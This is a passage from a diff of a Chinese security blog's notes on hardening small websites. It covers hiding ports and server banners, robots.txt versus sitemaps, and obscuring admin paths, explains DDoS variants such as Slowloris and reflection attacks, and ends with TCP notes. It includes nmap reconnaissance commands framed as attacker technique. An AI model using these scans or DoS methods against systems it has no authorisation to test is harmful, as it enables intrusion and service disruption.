+<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
+<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
+<blockquote>
+<p>·目标的端口号（确认攻击目标有哪些）。</p>
+<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
+<p>·目标是否有明显漏洞等信息。</p>
+</blockquote>
+<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
+<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
+<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
+<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
+<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
+<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
+<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
+<p><code>#nmap -sS 192.168.1.1</code></p>
+<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
+<p>如果配置文件不设置的话，就是默认配置。</p>
+<p>当然了，如果没发现目标端口</p>
+<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
+<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
+<blockquote>
+<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
+</blockquote>
+<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
+<blockquote>
+<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
+</blockquote>
+<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
+<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
+<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
+<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
+<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
+<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
+<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
+<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
+<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
+<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
+<p>攻击者获得目标服务器的banner信息方式为：</p>
+<blockquote>
+<p>1.利用NMAP进行扫描</p>
+<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
+</blockquote>
+<blockquote>
+<p>2.利用非正常页面查看banner信息</p>
+<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
+</blockquote>
+<blockquote>
+<p>3.抓取服务器response包一样会有服务器信息</p>
+<p>见bp抓的响应包中的server。</p>
+</blockquote>
+<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
+<p>几个中间件的banner修改方案如下：</p>
+<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
+<p>关闭版本号显示的方法如下：</p>
+<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
+<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
+<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
+</blockquote>
+<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
+<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
+<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
+<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
+<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
+<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
+</blockquote>
+<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
+<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
+</blockquote>
+<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
+<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
+<blockquote>
+<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
+</blockquote>
+<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
+<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
+<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
+<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
+<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>
+
+<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
+<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
+<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
+<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
+<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
+<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
+<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
+<blockquote>
+<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
+<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
+</blockquote>
+<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
+<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
+<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
+<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
+<blockquote>
+<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
+</blockquote>
+<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
+<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
+<blockquote>
+<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
+</blockquote>
+<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
+<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
+<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
+<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
+<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
+<p>这种攻击主要有以下几种形式：</p>
+<blockquote>
+<p>（1）Slowloris攻击</p>
+<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
+<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
+<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
+<p>kali自带一个slowhttptest工具</p>
+</blockquote>
+<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
+<blockquote>
+<p>（2）Slow HTTP POST</p>
+<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
+<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
+</blockquote>
+<blockquote>
+<p>（3）Slow Read Attack</p>
+<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
+</blockquote>
+<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
+<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
+<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
+<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
+<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
+<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
+<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
+<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
+<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
+<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
+<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
+<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
+<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
+<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
+<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
+<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
+<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
+<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
+]]></content>
+      <categories>
+        <category>《WEB安全基础》</category>
+        <category>防护识别</category>
+      </categories>
+      <tags>
+        <tag>《WEB安全基础》</tag>
+        <tag>防护识别</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第一篇博客</title>
+    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
+</blockquote>
+<p>主题优化参照如下：</p>
+<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
+]]></content>
+      <categories>
+        <category>博客搭建及其优化</category>
+      </categories>
+      <tags>
+        <tag>博客经验来源</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>知识基础</title>
     <url>/2023/05/13/%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a>1.域名</h2><p>internet上某台计算机或机组的名称</p>
@@ -3559,57 +4393,141 @@ echo $get
 <h3 id="问题44：web常用的加密算法有什么"><a href="#问题44：web常用的加密算法有什么" class="headerlink" title="问题44：web常用的加密算法有什么"></a>问题44：web常用的加密算法有什么</h3><p><strong>答案：</strong></p>
 <h3 id="问题45：XSS除了获取cookies还能做什么"><a href="#问题45：XSS除了获取cookies还能做什么" class="headerlink" title="问题45：XSS除了获取cookies还能做什么?"></a>问题45：XSS除了获取cookies还能做什么?</h3><p><strong>答案：</strong></p>
 <p> rip协议是什么? rip的工作原理</p>
-<h3 id="问题46：运营商（或其他）网络劫持"><a href="#问题46：运营商（或其他）网络劫持" class="headerlink" title="问题46：运营商（或其他）网络劫持"></a>问题46：运营商（或其他）网络劫持</h3>]]></content>
+<h3 id="问题46：运营商（或其他）网络劫持"><a href="#问题46：运营商（或其他）网络劫持" class="headerlink" title="问题46：运营商（或其他）网络劫持"></a>问题46：运营商（或其他）网络劫持</h3><h1 id="二、计网"><a href="#二、计网" class="headerlink" title="二、计网"></a>二、计网</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619125601482.png"></p>
+<p>TCP头部格式，重要部分：</p>
+<blockquote>
+<p><strong>序列号</strong>：在建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据，就「累加」一次该「数据字节数」的大小。<strong>用来解决网络包乱序问题。</strong></p>
+<p><strong>确认应答号</strong>：指下一次「期望」收到的数据的序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。<strong>用来解决不丢包的问题。</strong></p>
+<p><strong>控制位：</strong></p>
+<ul>
+<li><em>ACK</em>：该位为 <code>1</code> 时，「确认应答」的字段变为有效，TCP 规定除了最初建立连接时的 <code>SYN</code> 包之外该位必须设置为 <code>1</code> 。</li>
+<li><em>RST</em>：该位为 <code>1</code> 时，表示 TCP 连接中出现异常必须强制断开连接。</li>
+<li><em>SYC</em>：该位为 <code>1</code> 时，表示希望建立连，并在其「序列号」的字段进行序列号初始值的设定。</li>
+<li><em>FIN</em>：该位为 <code>1</code> 时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换 <code>FIN</code> 位置为 1 的 TCP 段。</li>
+</ul>
+</blockquote>
+<p>TCP 是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p>
+<blockquote>
+<ul>
+<li><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议 可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</li>
+<li><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；</li>
+<li><strong>字节流</strong>：消息是「没有边界」的，所以无论我们消息有多大都可以进行传输。并且消息是「有序的」，当「前一个」消息没有收到的时候，即使它先收到了后面的字节已经收到，那么也不能扔给应用层去处理，同时对「重复」的报文会自动丢弃。</li>
+</ul>
+</blockquote>
+<p>TCP连接是什么？</p>
+<blockquote>
+<p>建立一个 TCP 连接是需要客户端与服务器端达成以下三个信息的共识。</p>
+<ul>
+<li><strong>Socket</strong>：由 IP 地址和端口号组成</li>
+<li><strong>序列号</strong>：用来解决乱序问题等</li>
+<li><strong>窗口大小</strong>：用来做流量控制</li>
+</ul>
+</blockquote>
+<p>唯一确定一个 TCP 连接</p>
+<blockquote>
+<p>靠四元组。即</p>
+<ul>
+<li>源地址</li>
+<li>源端口</li>
+<li>目的地址</li>
